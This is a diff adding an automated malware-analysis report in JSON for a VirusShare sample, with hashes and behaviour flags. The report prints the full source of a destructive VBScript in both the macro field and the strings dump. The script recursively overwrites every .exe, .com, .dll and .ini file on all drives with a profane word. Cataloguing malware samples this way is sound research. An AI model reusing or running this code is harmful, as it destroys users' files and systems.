@@ -1,0 +1,55 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "createobject": "May create an OLE object",
+            "createtextfile": "May create a text file"
+        },
+        "macro": "\nSet Fso = createobject(\"scripting.filesystemobject\") \nSet Drives=fso.drives \nFor Each Drive in Drives\nIf drive.isready then\nCari drive & \"\\\"\nend If \nNext\nSub Cari(FIL)\nOn Error Resume Next\nSet Rusak = FSO.GetFolder(FIL)\nFor Each Kacau In Rusak.Files\nIf fso.GetExtensionName(Kacau.path)=\"exe\" or fso.GetExtensionName(Kacau.path)=\"com\" or fso.GetExtensionName(Kacau.path)=\"dll\" or fso.GetExtensionName(Kacau.path)=\"ini\" then\nSet dropper = Fso.createtextfile(Kacau.path, True)\ndropper.writeline \"FUCKER\"\ndropper.Close\nend if\nNext\nFor Each Lagi In Rusak.SubFolders\nCari(Lagi.Path)\nNext\nEnd Sub\n\n  "
+    },
+    "filename": "VirusShare_eb300725d8bb58763984e9cf888ba601",
+    "filesize": 617,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "eb300725d8bb58763984e9cf888ba601",
+        "sha1": "45e0d1de94abc02193900336a79ef576f5659449",
+        "sha256": "30f24cb1dbe5f0292a5cdddef8f6691b47e64dd4395ce61ab7046b5bd1de122d"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Set Fso = createobject(\"scripting.filesystemobject\") ",
+            "Set Drives=fso.drives ",
+            "For Each Drive in Drives",
+            "If drive.isready then",
+            "Cari drive & \"\\\"",
+            "end If ",
+            "Next",
+            "Sub Cari(FIL)",
+            "On Error Resume Next",
+            "Set Rusak = FSO.GetFolder(FIL)",
+            "For Each Kacau In Rusak.Files",
+            "If fso.GetExtensionName(Kacau.path)=\"exe\" or fso.GetExtensionName(Kacau.path)=\"com\" or fso.GetExtensionName(Kacau.path)=\"dll\" or fso.GetExtensionName(Kacau.path)=\"ini\" then",
+            "Set dropper = Fso.createtextfile(Kacau.path, True)",
+            "dropper.writeline \"FUCKER\"",
+            "dropper.Close",
+            "end if",
+            "Next",
+            "For Each Lagi In Rusak.SubFolders",
+            "Cari(Lagi.Path)",
+            "Next",
+            "End Sub"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.272090",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
